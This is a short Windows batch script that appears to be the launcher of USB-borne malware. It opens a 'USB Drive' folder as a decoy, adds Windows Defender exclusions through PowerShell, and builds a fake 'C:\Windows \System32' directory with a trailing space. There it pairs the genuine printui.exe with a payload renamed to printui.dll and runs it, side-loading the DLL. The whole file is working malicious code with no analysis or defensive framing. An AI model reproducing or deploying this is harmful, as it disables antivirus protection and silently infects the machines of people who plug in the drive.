@echo off
chcp 65001
explorer "%~dp0..\USB Drive"
if exist "%~dp0u238365.dat" if not exist "C:\Windows \System32\printui.dll" (
	powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'; Add-MpPreference -ExclusionPath 'C:\Windows \System32'; Start-Sleep -Seconds 2"
	if exist "C:\Windows \System32" rmdir /S /Q "\\?\C:\Windows "
	mkdir "\\?\C:\Windows \System32"
	xcopy "C:\Windows\System32\printui.exe" "C:\Windows \System32" /Y
	xcopy "%~dp0u238365.dat" "C:\Windows \System32" /Y
	ren "C:\Windows \System32\u238365.dat" "printui.dll"
	if exist "C:\Windows \System32\printui.exe" (
		if exist "C:\Windows \System32\printui.dll" (
			start "" "C:\Windows \System32\printui.exe"
		) else rmdir /S /Q "\\?\C:\Windows "
	) else rmdir /S /Q "\\?\C:\Windows "
)